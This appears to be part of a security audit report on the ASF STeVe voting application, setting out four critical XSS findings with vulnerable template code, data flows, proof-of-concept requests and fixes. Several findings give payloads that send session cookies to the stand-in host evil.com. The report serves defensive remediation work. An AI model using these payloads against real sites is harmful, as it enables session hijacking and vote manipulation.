### Critical Severity

#### ASVS-121-CRT-001: Stored XSS via Flash Messages Rendered Without HTML Encoding

**Severity:** Critical  
**Gap Type:** B (Control EXISTS but NOT CALLED — `[format "html"]` available in EZT but not used)

**Location:**
- **File:** `v3/server/templates/flashes.ezt`
- **Lines:** 1–6
- **Related Files:** `v3/server/pages.py` (multiple flash calls at lines ~426, ~455, ~518, ~537)

**Related Functions Checked:**
- `flash_success()` - ❌ No encoding applied to message content
- `flash_danger()` - ❌ No encoding applied to message content
- Template rendering in `flashes.ezt` - ❌ No `[format]` directive used

**Description:**

The application renders flash messages without HTML encoding, allowing stored XSS attacks through user-controlled data incorporated into flash message strings. The EZT template engine does not auto-escape output by default, and the `[format "html"]` directive is not applied to the `[flashes.message]` variable.

**Vulnerable Code:**

Template (`flashes.ezt`):
```html
[for flashes]
    <div class="alert alert-[flashes.category] alert-dismissible fade show" role="alert">
        [flashes.message]
        <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
    </div>
[end]
```

Python sources injecting user data into flashes (`pages.py`):
```python
# ~line 455
await flash_success(f'Created election: {form.title}')

# ~line 518
await flash_success(f'Issue "{form.title}" has been added.')

# ~line 537
await flash_success(f'Issue "{form.title}" has been updated.')

# ~line 426
await flash_danger(f'Invalid issue ID: {iid}')
```

**Data Flow:**
```
POST /do-create-election [form.title = "<img src=x onerror=alert(document.cookie)>"]
  ↓
pages.py:do_create_endpoint() 
  ↓
flash_success(f'Created election: {form.title}')
  ↓
quart session storage (flash)
  ↓
redirect to /manage/<eid>
  ↓
flashes.ezt: [flashes.message] rendered WITHOUT encoding
  ↓
<div class="alert ..."><img src=x onerror=alert(document.cookie)>...</div>
  ↓
XSS executes
```

**Proof of Concept:**
```http
POST /do-create-election HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: session=<valid_session>

title=<img+src%3Dx+onerror%3Dalert(document.cookie)>&csrf_token=placeholder
```

On redirect, the flash message `Created election: <img src=x onerror=alert(document.cookie)>` renders unencoded, executing JavaScript.

**Impact:**

Any authenticated user creating an election or issue with a malicious title triggers XSS on the subsequent page load. Since flash messages persist in the session, the victim is the user performing the action. An attacker who social-engineers a user into submitting a crafted form could exploit this against other users. This compromises session cookies and enables account takeover.

**Remediation:**

Apply HTML encoding to flash message output in the template:

```html
[for flashes]
    <div class="alert alert-[flashes.category] alert-dismissible fade show" role="alert">
        [format "html"][flashes.message][end]
        <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
    </div>
[end]
```

#### ASVS-121-CRT-002: Stored XSS via User-Controlled Data Rendered in HTML Context Without Encoding Across Multiple Templates

**Severity:** Critical  
**Gap Type:** B (Control EXISTS — `[format "js,html"]` is used for JS onclick contexts in the **same template files** — but NOT CALLED for HTML body rendering contexts)

**Location:**
- **Primary Files:**
  - `v3/server/templates/manage.ezt` (lines ~241, ~283)
  - `v3/server/templates/manage-stv.ezt` (lines ~175, ~196)
  - `v3/server/templates/admin.ezt` (line ~19)
  - `v3/server/templates/voter.ezt` (lines ~49, ~96)
  - `v3/server/templates/vote-on.ezt` (lines ~88, ~131, ~163)

**Related Functions Checked:**
- `election.add_issue()` - Stores user input without validation
- `election.list_issues()` - Retrieves stored data for display
- `rewrite_description()` in `pages.py` - ❌ Constructs HTML without pre-encoding
- Template rendering for election/issue titles and descriptions - ❌ No `[format]` directive used

**Description:**

Multiple templates render user-controlled data (election titles, issue titles, issue descriptions) in HTML contexts without applying output encoding. The same templates correctly use `[format "js,html"]` for JavaScript onclick contexts, demonstrating awareness of the encoding mechanism but inconsistent application. This represents a Type B gap where the control exists but is not called in the vulnerable contexts.

**Vulnerable Code:**

`manage.ezt` — HTML context **NOT encoded:**
```html
<!-- manage.ezt ~line 241 -->
<strong>[issues.title]</strong>
```
```html
<!-- manage.ezt ~line 283 -->
<div id="description-[issues.iid]" class="description mt-2">[issues.description]</div>
```

`manage.ezt` — JavaScript context in the **same file** **IS encoded:**
```html
<!-- manage.ezt ~line 261 -->
onclick="openEditIssueModal('[issues.iid]',
                            '[format "js,html"][issues.title][end]',
                            '[format "js,html"][issues.description][end]')"
```

Additional vulnerable locations:
```html
<!-- admin.ezt -->
<h5 class="card-title">[owned.title]</h5>

<!-- voter.ezt -->
<h5 class="card-title mb-3">[open_elections.title]</h5>

<!-- vote-on.ezt -->
<h1 class="h4 mb-0 fw-semibold">[election.title]</h1>
<strong>[issues.title]</strong>
```

**Data Flow:**
```
POST /do-add-issue/<eid> [form.title = "<script>fetch('https://evil.com/'+document.cookie)</script>"]
  ↓
pages.py:do_add_issue_endpoint()
  ↓
election.add_issue(form.title, ...)
  ↓
SQLite database (stored)
  ↓
GET /manage/<eid> or GET /vote-on/<eid>
  ↓
election.list_issues()
  ↓
template: <strong>[issues.title]</strong>
  ↓
<strong><script>fetch(...)</script></strong>
  ↓
Stored XSS executes for ALL users viewing this election
```

**Proof of Concept:**
```http
POST /do-add-issue/abc1234567 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: session=<valid_session>

title=%3Cscript%3Efetch('https://evil.com/'+document.cookie)%3C/script%3E&description=test&csrf_token=placeholder
```

Every voter accessing `/vote-on/abc1234567` will execute the script.

**Impact:**

An election administrator can inject persistent JavaScript that executes in the browsers of **all voters** viewing the election. This compromises voter session cookies, enables vote manipulation, and breaks election integrity. The impact is amplified because the vulnerability affects the core voting interface where sensitive actions occur.

**Remediation:**

Apply `[format "html"]` to all user-controlled template variables in HTML contexts:

```html
<strong>[format "html"][issues.title][end]</strong>
<div class="description mt-2">[format "html"][issues.description][end]</div>
<h5 class="card-title">[format "html"][owned.title][end]</h5>
<h1 class="h4 mb-0 fw-semibold">[format "html"][election.title][end]</h1>
```

Additionally, fix `rewrite_description()` in `pages.py` to HTML-encode description text before wrapping in HTML:

```python
import html

def rewrite_description(issue):
    desc = html.escape(issue.description)  # Encode FIRST
    def repl(match):
        filename = html.escape(match.group(1))
        return f'<a href="/docs/{issue.iid}/{filename}">{filename}</a>'
    desc = re.sub(r'doc:([^\s]+)', repl, desc)
    issue.description = f'<pre>{desc}</pre>'
```

#### ASVS-121-CRT-003: Stored XSS via Unencoded Server Data Embedded in JavaScript Context in vote-on.ezt

**Severity:** Critical  
**Gap Type:** B (Control EXISTS — `[format "js,html"]` is used in `manage.ezt` JS onclick handlers — but NOT CALLED for inline JavaScript data embedding in `vote-on.ezt`)

**Location:**
- **File:** `v3/server/templates/vote-on.ezt`
- **Lines:** ~215–228 (inline `<script>` block)
- **Related File:** `v3/server/pages.py` (lines ~258–263)

**Related Functions Checked:**
- `vote_on_page()` in `pages.py` - Prepares STV candidate data for template
- Template rendering of inline JavaScript data structure - ❌ No `[format]` directive used
- Client-side `escapeHtml()` function - ✅ Exists but does NOT protect server-rendered data

**Description:**

The voting page embeds server-side data (STV issue titles and candidate names) directly into an inline JavaScript object literal without applying JavaScript encoding. An election administrator can inject JavaScript code through issue titles or candidate names that breaks out of the string context and executes arbitrary code in the browsers of all voters.

**Vulnerable Code:**

Template (`vote-on.ezt`):
```javascript
const STV_CANDIDATES = {
    "[issues.iid]": {
      seats: [issues.seats],
      title: "[issues.title]",
      candidates: [
        { label: "[issues.candidates.label]", name: "[issues.candidates.name]" },
      ]
    },
};
```

Source (`pages.py` ~lines 258–263):
```python
for issue in issues_stv:
    issue.seats = issue.kv.get('seats', 0)
    issue.labelmap = edict(issue.kv.get('labelmap', {}))
    issue.candidates = [{'label': k, 'name': v} for k, v in issue.labelmap.items()]
```

**Data Flow:**
```
Admin creates STV issue with title: test", x: 1}; fetch('https://evil.com/'+document.cookie);//
  ↓
stored in database
  ↓
GET /vote-on/<eid>
  ↓
vote_on_page() → template rendering
  ↓
JS: title: "test", x: 1}; fetch('https://evil.com/'+document.cookie);//"
  ↓
JavaScript injection executes
```

**Proof of Concept:**

An election admin sets an STV issue title to:
```
test", _: 0}; document.location='https://evil.com/?c='+document.cookie;//
```

Or sets a candidate name in the KV labelmap to the same payload.

When any voter visits `/vote-on/<eid>`, the rendered JavaScript becomes:
```javascript
title: "test", _: 0}; document.location='https://evil.com/?c='+document.cookie;//",
```

This breaks out of the string literal and injects arbitrary JavaScript.

**Impact:**

An election administrator can inject JavaScript that executes in the context of **every voter** who opens the voting page. The client-side `escapeHtml()` function in the same file does NOT protect against this — it only applies to dynamic DOM operations, not the server-rendered inline data block. This enables vote manipulation, session hijacking, and complete compromise of the voting process.

**Remediation:**

Use `[format "js"]` or `[format "js,html"]` for all user-controlled values in JavaScript contexts:

```javascript
const STV_CANDIDATES = {
    "[issues.iid]": {
      seats: [issues.seats],
      title: "[format "js"][issues.title][end]",
      candidates: [
[for issues.candidates]        { label: "[format "js"][issues.candidates.label][end]", name: "[format "js"][issues.candidates.name][end]" },
[end]      ]
    },
};
```

#### ASVS-121-CRT-004: Reflected XSS via URL Path Parameters in Error Templates Without HTML Encoding

**Severity:** Critical  
**Gap Type:** B (Control EXISTS — `[format "html"]` available in EZT — but NOT CALLED in error templates)

**Location:**
- **Files:**
  - `v3/server/templates/e_bad_eid.ezt` (line 8)
  - `v3/server/templates/e_bad_iid.ezt` (line 8)
  - `v3/server/templates/e_bad_pid.ezt` (line 8)
- **Related File:** `v3/server/pages.py`
  - `load_election()` decorator (~line 175)
  - `load_election_issue()` decorator (~line 200)
  - `admin_page()` (~line 328)

**Related Functions Checked:**
- `load_election()` decorator - ❌ Sets `result.eid` from URL without encoding
- `load_election_issue()` decorator - ❌ Sets `result.iid` from URL without encoding
- `admin_page()` - ❌ Sets `result.pid` from URL without encoding
- Error template rendering - ❌ No `[format]` directive used

**Description:**

Error page templates render URL path parameters (election ID, issue ID, person ID) directly into HTML without encoding. When an invalid ID is accessed, the application displays an error message that includes the user-supplied ID value. An attacker can craft a malicious URL containing JavaScript that executes when the error page is rendered.

**Vulnerable Code:**

Template (`e_bad_eid.ezt`):
```html
The Election ID ([eid]) does not exist,
you have no issues to vote in that Election,
or you are not allowed to manage that Election.
```

Python decorator (`pages.py` — `load_election`):
```python
async def loader(eid):
    try:
        e = steve.election.Election(DB_FNAME, eid)
    except steve.election.ElectionNotFound:
        result = await basic_info()
        result.title = 'Unknown Election'
        result.eid = eid  # User-controlled URL parameter set directly
        raise_404(T_BAD_EID, result)
```

**Data Flow:**
```
GET /vote-on/%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
  ↓
Quart URL-decodes: eid = "<img src=x onerror=alert(1)>"
  ↓
ElectionNotFound raised
  ↓
result.eid = "<img src=x onerror=alert(1)>"
  ↓
e_bad_eid.ezt: The Election ID ([eid]) → rendered without encoding
  ↓
<img src=x onerror=alert(1)> in HTML response
  ↓
Reflected XSS
```

**Proof of Concept:**
```
GET /manage/%3Csvg%20onload%3Dalert(document.domain)%3E HTTP/1.1
```

The 404 page renders:
```
The Election ID (<svg onload=alert(document.domain)>) does not exist...
```

**Impact:**

An attacker can craft a URL that, when clicked by an authenticated user, executes arbitrary JavaScript in the context of the voting application. This enables session hijacking of authenticated ASF committers and could be used in phishing attacks targeting election administrators or voters.

**Remediation:**

Apply HTML encoding to URL parameters in error templates:

```html
<!-- e_bad_eid.ezt -->
The Election ID ([format "html"][eid][end]) does not exist, ...

<!-- e_bad_iid.ezt -->
The Issue ID ([format "html"][iid][end]) does not exist, ...

<!-- e_bad_pid.ezt -->
The Person ID ([format "html"][pid][end]) does not exist, ...
```

## Architecture Observations

### Template Engine Design

**EZT does not auto-escape by default.** Unlike modern template engines (Jinja2 with autoescape, Django templates), EZT renders variables verbatim. This means every output point requires explicit `[format]` directives. The codebase demonstrates awareness of this (using `[format "js,html"]` in some places) but applies it inconsistently — only in JavaScript attribute contexts, never in HTML body contexts.

### Systematic Gap Pattern

**The encoding gap is systematic, not incidental.** Every template that renders user-controlled data in HTML body context lacks encoding. This suggests the developers may have believed EZT auto-escapes (it does not), or that the `[format]` directive was only needed for JavaScript contexts. The presence of correct encoding in JavaScript onclick handlers proves the team understands context-aware encoding, but the pattern was not applied comprehensively.

### Anti-Pattern in HTML Construction

**The `rewrite_description()` function creates an encoding anti-pattern.** By intentionally constructing HTML (`<pre>`, `<a>`) from user input without pre-escaping, it makes template-level encoding impossible (encoding would break the intended tags). The fix requires encoding at the function level before HTML construction, representing a server-side XSS vulnerability that cannot be addressed solely through template changes.

### Defense-in-Depth Observations

The application demonstrates strong SQL injection defenses through parameterized queries and proper static file handling. However, the XSS defense layer is fundamentally compromised by the lack of output encoding. The client-side `escapeHtml()` function provides defense-in-depth for dynamically created DOM elements but does not protect server-rendered content, which is the primary attack surface.

### Immediate Actions (Critical Priority)
